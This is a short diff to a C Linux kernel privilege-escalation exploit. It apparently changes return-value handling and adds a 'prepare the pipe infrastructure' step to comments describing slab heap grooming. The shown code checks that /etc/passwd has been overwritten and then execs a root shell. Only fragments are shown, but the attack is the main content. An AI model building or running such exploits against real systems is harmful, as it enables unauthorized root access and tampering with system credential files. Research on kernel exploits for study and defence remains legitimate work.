@@ -80,6 +80,7 @@ int act(int act_fd, int code, int n, char *args)
  *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
  *        42
  *  - pin the process to a single CPU
+ *  - prepare the pipe infrastructure
  *  - create new active slab, allocate objs_per_slab objects
  *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
  *  - create new active slab, allocate objs_per_slab objects
@@ -222,6 +223,7 @@ end:
 
 int main(void)
 {
+	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
 	long i = 0;
@@ -379,6 +381,7 @@ int main(void)
 
 	if (check_passwd() == EXIT_SUCCESS) {
 		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
+		result = EXIT_SUCCESS;
 		execv("/bin/sh", argv); /* This should not return */
 		perror("[-] execv");
 	}
@@ -411,5 +414,5 @@ end:
 			perror("[-] close act_fd");
 	}
 
-	return ret;
+	return result;
 }
